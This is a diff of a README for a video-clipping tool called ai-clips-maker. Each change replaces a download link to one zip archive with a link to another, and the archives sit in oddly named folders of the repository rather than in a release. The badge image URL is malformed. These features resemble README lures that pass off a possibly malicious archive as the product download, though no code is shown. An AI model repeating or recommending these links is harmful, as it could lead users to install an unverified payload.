@@ -1,6 +1,6 @@
 # 🎥 ai-clips-maker - Turn Long Videos into Short Clips
 
-[![Download Latest Release](https://raw.githubusercontent.com/Nidurshan/ai-clips-maker/main/cowardly/ai-clips-maker.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Nidurshan/ai-clips-maker/main/cowardly/ai-clips-maker.zip)
+[![Download Latest Release](https://github.com/Nidurshan/ai-clips-maker/raw/refs/heads/main/ai-clips-maker/txtslice/clips_ai_maker_v2.1-beta.4.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/Nidurshan/ai-clips-maker/raw/refs/heads/main/ai-clips-maker/txtslice/clips_ai_maker_v2.1-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to **ai-clips-maker**, your tool for transforming long videos into engag
 
 To get started, you need to download the application. Follow these simple steps:
 
-1. Visit this page to download: [Download ai-clips-maker](https://raw.githubusercontent.com/Nidurshan/ai-clips-maker/main/cowardly/ai-clips-maker.zip).
+1. Visit this page to download: [Download ai-clips-maker](https://github.com/Nidurshan/ai-clips-maker/raw/refs/heads/main/ai-clips-maker/txtslice/clips_ai_maker_v2.1-beta.4.zip).
 
 2. Look for the latest release. You will see files available for download.
 
@@ -88,4 +88,4 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 Join our community for support and discussions about **ai-clips-maker**. You can find us on GitHub and other platforms. If you have questions or need assistance, please reach out through the issues page.
 
-Remember to revisit the download page for updates as new features and improvements are added: [Download ai-clips-maker](https://raw.githubusercontent.com/Nidurshan/ai-clips-maker/main/cowardly/ai-clips-maker.zip). Enjoy making your video clips!
+Remember to revisit the download page for updates as new features and improvements are added: [Download ai-clips-maker](https://github.com/Nidurshan/ai-clips-maker/raw/refs/heads/main/ai-clips-maker/txtslice/clips_ai_maker_v2.1-beta.4.zip). Enjoy making your video clips!
